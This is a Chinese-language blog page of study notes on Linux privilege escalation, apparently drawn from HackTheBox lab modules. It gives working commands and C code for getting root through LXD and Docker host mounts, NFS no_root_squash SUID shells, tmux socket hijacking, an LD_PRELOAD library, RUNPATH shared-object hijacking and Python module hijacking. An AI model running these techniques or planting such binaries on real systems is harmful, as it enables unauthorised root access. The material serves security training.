@@ -1,0 +1,743 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Linux_Privilege_Escalation3</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Linux_Privilege_Escalation3 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/17
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#ffa2c4>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><p>容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。</p>
+<span id="more"></span>
+
+<h2 id="Linux-Containers"><a href="#Linux-Containers" class="headerlink" title="Linux Containers"></a>Linux Containers</h2><p>Linux容器（LXC）是一种操作系统级的虚拟化技术，它允许多个Linux系统通过拥有自己的进程但共享主机系统内核而在单个主机上彼此隔离运行。</p>
+<h4 id="Linux-Daemon"><a href="#Linux-Daemon" class="headerlink" title="Linux Daemon"></a>Linux Daemon</h4><p><a target="_blank" rel="noopener" href="https://github.com/lxc/lxd">LXD</a>在某些方面与之相似，但其设计目的是包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。在我们可以使用此服务升级我们的权限之前，我们必须在lxc或lxd组中。</p>
+<p>从现在开始，我们有几种方法可以利用LXC&#x2F;LXD。我们可以创建自己的容器并将其传输到目标系统，也可以使用现有的容器。不幸的是，管理员经常使用几乎没有安全性的模板。这种态度的后果是，我们已经有了可以自己用来对付这个系统的工具。</p>
+<pre><code class="shell-session">container-user@nix02:~$ cd ContainerImages
+container-user@nix02:~$ ls
+
+ubuntu-template.tar.xz
+</code></pre>
+<p>这样的模板通常没有密码，特别是如果它们是简单的测试环境。这些应该可以快速访问并且使用起来不复杂。对安全的关注将使整个启动过程复杂化，使其更加困难，从而大大减缓启动速度。如果我们有点幸运，并且系统上有这样一个容器，它可以被利用。为此，我们需要将此容器作为镜像导入。</p>
+<pre><code class="shell-session">container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+container-user@nix02:~$ lxc image list
+</code></pre>
+<p>在验证此映像已成功导入后，我们可以启动映像并通过指定容器的security.privileged标志和根路径对其进行配置。此标志将禁用允许我们对主机执行操作的所有隔离功能。</p>
+<pre><code class="shell-session">container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
+container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+</code></pre>
+<blockquote>
+<ol>
+<li><code>lxc init ubuntutemp privesc -c security.privileged=true</code><ul>
+<li><code>lxc init</code>: 创建一个新的容器配置。</li>
+<li><code>ubuntutemp</code>: 源容器的名称。在此命令中，<code>ubuntutemp</code> 是已存在的容器的名称，将作为基础来创建新的容器。</li>
+<li><code>privesc</code>: 新容器的名称。在这里，<code>privesc</code> 是要创建的新容器的名称。</li>
+<li><code>-c security.privileged=true</code>: 这个选项用于将新创建的容器标记为 “特权容器”，即赋予它在主机系统上访问某些特权功能的能力。</li>
+</ul>
+</li>
+<li><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code><ul>
+<li><code>lxc config device add</code>: 向容器配置中添加设备。</li>
+<li><code>privesc</code>: 容器的名称，这里是之前创建的名为 <code>privesc</code> 的容器。</li>
+<li><code>host-root</code>: 新设备的名称，这里是自定义的名称，表示要添加到容器中的设备的名称。</li>
+<li><code>disk</code>: 设备类型，这里是要添加的设备类型是磁盘。</li>
+<li><code>source=/</code>: 设备的源路径，这里指定的是 <code>/</code>，表示要将主机系统的根目录挂载到容器中。</li>
+<li><code>path=/mnt/root</code>: 设备的目标路径，这里指定的是 <code>/mnt/root</code>，表示将主机系统的根目录挂载到容器中的 <code>/mnt/root</code> 目录。</li>
+<li><code>recursive=true</code>: 指定递归地挂载整个文件系统。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>完成后，我们可以启动容器并登录到其中。在容器中，我们可以转到指定的路径，以root身份访问主机系统的资源。</p>
+<pre><code class="shell-session">container-user@nix02:~$ lxc start privesc
+container-user@nix02:~$ lxc exec privesc /bin/bash
+root@nix02:~# ls -l /mnt/root
+</code></pre>
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>要通过Docker获得root权限，我们登录的用户必须在Docker组中。这使他能够使用和控制Docker守护进程。</p>
+<p>或者，Docker可能设置了SUID，或者我们在Sudoers文件中，这允许我们以root身份运行Docker。这三个选项都允许我们与Docker合作以提升我们的特权。 大多数主机都有直接的互联网连接，因为必须下载基本映像和容器。然而，出于安全原因，许多主机可能在夜间和工作时间以外与互联网断开连接。然而，如果这些主机位于网络中，例如，web服务器必须通过该网络，则仍然可以访问该网络。 要查看存在哪些镜像以及我们可以访问哪些镜像，我们可以使用以下命令：</p>
+<h4 id="Linux-Docker"><a href="#Linux-Docker" class="headerlink" title="Linux Docker"></a>Linux Docker</h4><pre><code class="shell-session">docker-user@nix02:~$ docker image ls
+
+REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
+ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
+</code></pre>
+<h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p>当Docker套接字是可写的时，也可能发生这种情况。通常这个套接字位于&#x2F;var&#x2F;run&#x2F;doker.sock.但是，可以理解的是，位置不同。因为基本上，这只能由root或docker组编写。如果我们作为不在这两个组中的用户，并且Docker套接字仍然具有可写的权限，那么我们仍然可以使用这种情况来升级我们的权限。</p>
+<pre><code class="shell-session">docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+root@ubuntu:~# ls -l /mnt
+</code></pre>
+<blockquote>
+<p>该命令使用 Docker 在容器中运行 Ubuntu 镜像，并将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录，然后进入容器的 Bash shell。</p>
+<p>解析该命令的各个部分：</p>
+<ul>
+<li><code>docker</code>：Docker 命令，用于管理容器和镜像。</li>
+<li><code>-H unix:///var/run/docker.sock</code>：指定 Docker 的主机地址，这里是 Unix 域套接字地址，用于与 Docker 守护进程通信。</li>
+<li><code>run</code>：Docker 命令，用于创建并运行一个新的容器。</li>
+<li><code>-v /:/mnt</code>：指定容器的数据卷挂载，将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录。这样在容器中可以访问宿主机的整个文件系统。</li>
+<li><code>--rm</code>：指定容器退出时自动删除容器。当容器退出后，自动清理容器的数据。</li>
+<li><code>-it</code>：启用交互式模式并分配一个伪终端 (pseudo-TTY)。这样可以进入容器并与其交互。</li>
+<li><code>ubuntu</code>：要运行的容器镜像，这里是 Ubuntu 镜像。</li>
+<li><code>chroot /mnt bash</code>：在容器内运行的命令，这里是 <code>chroot</code> 命令切换根目录到 <code>/mnt</code> 目录，然后启动 Bash shell。</li>
+</ul>
+</blockquote>
+<h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Weak-NFS-Privileges"><a href="#Weak-NFS-Privileges" class="headerlink" title="Weak NFS Privileges"></a>Weak NFS Privileges</h2><p>网络文件系统（NFS）允许用户通过Unix&#x2F;Linux系统上托管的网络访问共享文件或目录。NFS使用TCP&#x2F;UDP端口2049。任何可访问的装载都可以通过发出命令showmount-e远程列出，该命令列出NFS客户端的NFS服务器的导出列表（或文件系统的访问控制列表）。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ showmount -e 10.129.2.12
+
+Export list for 10.129.2.12:
+/tmp             *
+/var/nfs/general *
+</code></pre>
+<p>创建NFS卷时，可以设置各种选项： </p>
+<p>root_squash： 如果root用户用于访问NFS共享，它将被更改为nfsnobody用户，这是一个没有特权的帐户。root用户创建和上传的任何文件都将归nfsnobody用户所有，这可以防止攻击者上传SUID位设置的二进制文件。</p>
+<p> no_root_squash：作为本地根用户连接到共享的远程用户将能够作为根用户在NFS服务器上创建文件。这将允许创建具有SUID位集的恶意脚本&#x2F;程序。</p>
+<pre><code class="shell-session">htb@NIX02:~$ cat /etc/exports
+
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+</code></pre>
+<p>例如，我们可以创建一个SETUID二进制文件，使用本地根用户执行&#x2F;bin&#x2F;sh。然后，我们可以在本地装载&#x2F;tmp目录，将root拥有的二进制文件复制到NFS服务器，并设置SUID位。 首先，创建一个简单的二进制文件，在本地装载目录，复制它，并设置必要的权限。</p>
+<pre><code class="shell-session">htb@NIX02:~$ cat shell.c 
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main(void)
+&#123;
+  setuid(0); setgid(0); system(&quot;/bin/bash&quot;);
+&#125;
+</code></pre>
+<pre><code class="shell-session">htb@NIX02:/tmp$ gcc shell.c -o shell
+</code></pre>
+<pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+root@Pwnbox:~$ cp shell /mnt
+root@Pwnbox:~$ chmod u+s /mnt/shell
+</code></pre>
+<pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+root@Pwnbox:~$ cp shell /mnt
+root@Pwnbox:~$ chmod u+s /mnt/shell
+</code></pre>
+<pre><code class="shell-session">htb@NIX02:/tmp$ ./shell
+root@NIX02:/tmp# id
+
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
+</code></pre>
+<h2 id="Hijacking-Tmux-Sessions"><a href="#Hijacking-Tmux-Sessions" class="headerlink" title="Hijacking Tmux Sessions"></a>Hijacking Tmux Sessions</h2><p>诸如 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tmux">tmux</a>之类的终端多路复用器可以用于允许在单个控制台会话内访问多个终端会话。当不在tmux窗口中工作时，我们可以从会话分离，仍然保持它处于活动状态（即，运行nmap扫描）。由于许多原因，用户可能会让tmux进程以特权用户的身份运行，例如使用弱权限设置的root，并可能被劫持。这可以通过以下命令来完成，以创建新的共享会话并修改所有权。</p>
+<pre><code class="shell-session">htb@NIX02:~$ tmux -S /shareds new -s debugsess
+htb@NIX02:~$ chown root:devs /shareds
+</code></pre>
+<blockquote>
+<ol>
+<li><p><code>tmux -S /shareds new -s debugsess</code>：这个命令用于创建一个新的 tmux 会话，并将会话的控制 socket（控制 socket 用于与会话通信）设置为 <code>/shareds</code> 目录下的 <code>debugsess</code> 文件。<code>tmux</code> 是一个终端复用工具，允许用户在单个终端窗口中创建多个会话，并在会话之间切换。</p>
+</li>
+<li><p><code>chown root:devs /shareds</code>：这个命令用于更改 <code>/shareds</code> 目录的所有者和所属组。<code>chown</code> 是 Linux 中用于修改文件或目录所有者和所属组的命令。在这里，将 <code>/shareds</code> 目录的所有者设置为 <code>root</code> 用户，所属组设置为 <code>devs</code> 组。</p>
+</li>
+<li><p>设置 <code>/shareds</code> 目录的所属组为 <code>devs</code> 组后，该目录的成员将具有与所有者 <code>root</code> 相同的访问权限。这是因为在 Linux 系统中，文件和目录的权限由三种身份来控制：所有者、所属组和其他用户。</p>
+<p>在这种设置下，<code>root</code> 用户是 <code>/shareds</code> 目录的所有者，而 <code>devs</code> 组是该目录的所属组。Linux 文件系统中的文件和目录权限分为读取（r）、写入（w）和执行（x）权限，可以针对所有者、所属组和其他用户分别设置。</p>
+<p>由于 <code>root</code> 是 <code>/shareds</code> 目录的所有者，因此 <code>root</code> 用户将拥有所有权限，即读取、写入和执行权限。</p>
+<p>同时，由于 <code>devs</code> 组是 <code>/shareds</code> 目录的所属组，并且设置了 <code>chown root:devs /shareds</code>，因此 <code>devs</code> 组的成员将拥有与所有者 <code>root</code> 相同的权限。这意味着 <code>devs</code> 组的成员可以读取、写入和执行 <code>/shareds</code> 目录及其内部的文件。</p>
+</li>
+</ol>
+</blockquote>
+<p>如果我们可以危害dev组中的用户，我们可以连接到此会话并获得root访问权限。 检查是否有任何正在运行的tmux进程。</p>
+<pre><code class="shell-session">htb@NIX02:~$  ps aux | grep tmux
+
+root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
+</code></pre>
+<p>确认权限。</p>
+<pre><code class="shell-session">htb@NIX02:~$ ls -la /shareds 
+
+srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
+</code></pre>
+<pre><code class="shell-session">htb@NIX02:~$ id
+
+uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
+</code></pre>
+<pre><code class="shell-session">htb@NIX02:~$ tmux -S /shareds
+
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux程序通常使用动态链接的共享对象库。库包含已编译的代码或其他数据，开发人员使用这些数据来避免在多个程序中重写相同的代码。Linux中存在两种类型的库：静态库（用.a文件扩展名表示）和动态链接的共享对象库（用.so文件扩展名指示）。编译程序时，静态库将成为程序的一部分，并且不能更改。但是，可以修改动态库来控制调用它们的程序的执行。 有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的-rpath或-rpath链接标志，使用环境变量LD_RUN_PATH或LD_LIBRARY_PATH，将库放置在&#x2F;lib或&#x2F;usr&#x2F;lib默认目录中，或在&#x2F;etc&#x2F;LD.so.conf配置文件中指定另一个包含库的目录。 此外，LD_PRELOAD环境变量可以在执行二进制文件之前加载库。该库中的函数优先于默认函数。二进制文件所需的共享对象可以使用ldd实用程序查看。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ ldd /bin/ls
+
+    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)
+    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
+    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
+    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
+    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
+    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
+    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
+</code></pre>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() &#123;
+unsetenv(&quot;LD_PRELOAD&quot;);
+setgid(0);
+setuid(0);
+system(&quot;/bin/bash&quot;);
+&#125;
+</code></pre>
+<p>我们可以将其编译如下：</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
+</code></pre>
+<blockquote>
+<ol>
+<li><code>gcc</code>: GCC（GNU Compiler Collection）是一个流行的编译器套件，用于编译 C、C++ 等编程语言的源代码。</li>
+<li><code>-fPIC</code>: 这个选项告诉编译器生成位置无关代码（Position Independent Code，PIC），这样编译的共享库可以在内存中的任意位置加载，有助于共享库在不同进程之间共享代码段。</li>
+<li><code>-shared</code>: 这个选项告诉编译器生成共享库而不是可执行文件。</li>
+<li><code>-o root.so</code>: 这个选项指定输出的文件名为 <code>root.so</code>，即编译生成的共享库的文件名。</li>
+<li><code>root.c</code>: 这是输入的源代码文件名，这里假设 <code>root.c</code> 是包含共享库的 C 代码文件。</li>
+<li><code>-nostartfiles</code>: 这个选项告诉编译器不使用标准启动文件，通常用于生成不依赖标准 C 库的共享库。</li>
+</ol>
+</blockquote>
+<p>最后，我们可以使用以下命令升级权限。请确保指定恶意库文件的完整路径。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so 【Privilege command】
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>补充一下：</p>
+<blockquote>
+<p>查看系统中是否有命令使用了 <code>LD_PRELOAD</code> 可能比较复杂，因为 <code>LD_PRELOAD</code> 是一个环境变量，可以在各种脚本、配置文件或命令中设置，甚至在程序运行时通过 <code>dlopen()</code> 等函数动态加载共享库。</p>
+<p>以下是一些可能使用 <code>LD_PRELOAD</code> 的常见命令或程序：</p>
+<ol>
+<li><p><code>ldd</code>: <code>ldd</code> 命令本身会使用 <code>LD_PRELOAD</code> 来查找程序所依赖的共享库。</p>
+</li>
+<li><p>动态链接的程序：那些使用动态链接的程序，如自己编写的程序、第三方程序或系统工具，可能在启动时使用了 <code>LD_PRELOAD</code> 来预加载共享库。</p>
+</li>
+<li><p>启动脚本或配置文件：有些应用程序的启动脚本或配置文件中可能设置了 <code>LD_PRELOAD</code> 环境变量。</p>
+</li>
+<li><p>调试工具：一些调试工具可能使用 <code>LD_PRELOAD</code> 来注入共享库，从而实现调试目标程序。</p>
+</li>
+<li><p>系统设置：在某些情况下，系统级别的设置或安全策略可能设置了全局的 <code>LD_PRELOAD</code>，从而影响所有程序的运行。</p>
+</li>
+</ol>
+<p>要查找系统中所有使用了 <code>LD_PRELOAD</code> 的命令，您可以使用以下方法：</p>
+<ol>
+<li><p>使用 <code>grep</code> 命令：在系统目录和用户目录中查找包含 <code>LD_PRELOAD</code> 的文件。例如：</p>
+<pre><code class="bash">grep -rnw &#39;/&#39; -e &quot;LD_PRELOAD&quot;
+</code></pre>
+<p>这会在整个系统中递归地查找包含 <code>LD_PRELOAD</code> 的文件，并列出相应的行和文件名。</p>
+</li>
+<li><p>使用 <code>ps</code> 命令：查看当前正在运行的进程中是否有使用了 <code>LD_PRELOAD</code> 的程序。例如：</p>
+<pre><code class="bash">ps -eo pid,args | grep &quot;LD_PRELOAD&quot;
+</code></pre>
+<p>这会列出当前正在运行的进程中包含 <code>LD_PRELOAD</code> 的命令行。</p>
+</li>
+</ol>
+<p>请注意，找到使用 <code>LD_PRELOAD</code> 的命令并不意味着它们一定是恶意的或具有安全风险的。某些合法的程序可能需要使用 <code>LD_PRELOAD</code> 来实现特定功能或调试需求。然而，在生产环境中，对于未知来源或未经验证的 <code>LD_PRELOAD</code> 设置需要谨慎处理，以确保系统安全。</p>
+</blockquote>
+<h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与其相关联的自定义库。请考虑以下SETUID二进制文件。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ ls -la payroll
+
+-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
+</code></pre>
+<p>我们可以使用ldd来打印二进制或共享对象所需的共享对象。对于程序的每个依赖项，Ldd显示对象的位置和加载到内存中的十六进制地址。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)
+libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
+libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+</code></pre>
+<p>我们看到一个名为libshared.so的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。一个这样的设置是RUNPATH配置。此文件夹中的库优先于其他文件夹。这可以使用<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a> 实用程序进行检查。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ readelf -d payroll  | grep PATH
+
+ 0x000000000000001d (RUNPATH)            Library runpath: [/development]
+</code></pre>
+<p>该配置允许从&#x2F;development文件夹加载库，该文件夹可由所有用户写入。此错误配置可通过在&#x2F;development中放置恶意库来利用，该库将优先于其他文件夹，因为首先检查此文件中的条目（在配置文件中存在其他文件夹之前）。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ ls -la /development/
+
+total 8
+drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
+drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
+</code></pre>
+<p>在编译库之前，我们需要找到二进制调用的函数名。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+</code></pre>
+<pre><code class="shell-session">htb_student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 (0x00007ffd22bbc000)
+libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+</code></pre>
+<pre><code class="shell-session">htb_student@NIX02:~$ ./payroll 
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+</code></pre>
+<p>我们可以将现有库复制到开发文件夹中。对二进制文件运行ldd会将库的路径列为&#x2F;development&#x2F;libshared.so，这意味着它很容易受到攻击。执行二进制文件会引发一个错误，说明它找不到名为dbquery的函数。我们可以编译一个包含此函数的共享对象。</p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+void dbquery() &#123;
+    printf(&quot;Malicious library loaded\n&quot;);
+    setuid(0);
+    system(&quot;/bin/sh -p&quot;);
+&#125; 
+</code></pre>
+<p>dbquery函数将我们的用户id设置为0（root），并在调用时执行&#x2F;bin&#x2F;sh。使用GCC进行编译。</p>
+<pre><code class="shell-session">htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
+</code></pre>
+<pre><code class="shell-session">htb_student@NIX02:~$ ./payroll 
+
+***************Inlane Freight Employee Database***************
+
+Malicious library loaded
+# id
+uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
+</code></pre>
+<h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><p>我们可以通过多种方式劫持Python库。这在很大程度上取决于剧本及其内容本身。但是，有三个基本漏洞可以用来进行劫持： </p>
+<ul>
+<li>写入权限错误 </li>
+<li>库路径 </li>
+<li>PYTHONPATH环境变量</li>
+</ul>
+<h2 id="Wrong-Write-Permissions"><a href="#Wrong-Write-Permissions" class="headerlink" title="Wrong Write Permissions"></a>Wrong Write Permissions</h2><p>例如，我们可以想象我们在公司内部网上的一个开发人员的主机上，而开发人员正在使用python。所以我们总共有三个组件是相连的。这是导入python模块的实际python脚本、脚本的权限以及模块的权限。 一个或另一个python模块可能错误地为所有用户设置了写入权限。这允许对python模块进行编辑和操作，以便我们可以插入将产生我们想要的结果的命令或函数。如果SUID&#x2F;SGID权限已分配给导入此模块的Python脚本，我们的代码将自动包含在内。 如果我们查看mem_stats.py脚本的设置权限，我们可以看到它有一个SUID集。</p>
+<pre><code class="shell-session">htb-student@lpenix:~$ ls -l mem_stats.py
+
+-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py
+</code></pre>
+<p>因此，我们可以使用另一个用户（在我们的案例中，作为root用户）的权限来执行此脚本。我们还拥有查看脚本和阅读其内容的权限。</p>
+<h4 id="Python-Script-Contents"><a href="#Python-Script-Contents" class="headerlink" title="Python Script - Contents"></a>Python Script - Contents</h4><pre><code class="python">#!/usr/bin/env python3
+import psutil
+
+available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+
+print(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)
+</code></pre>
+<p>所以这个脚本非常简单，只显示可用虚拟内存的百分比。我们还可以在第二行中看到，该脚本导入模块psutil并使用函数virtual_memory（）。 因此，我们可以在psutil的文件夹中查找此函数，并检查此模块是否具有写入权限。 </p>
+<h4 id="Module-Permissions"><a href="#Module-Permissions" class="headerlink" title="Module Permissions"></a>Module Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*
+
+/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
+/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
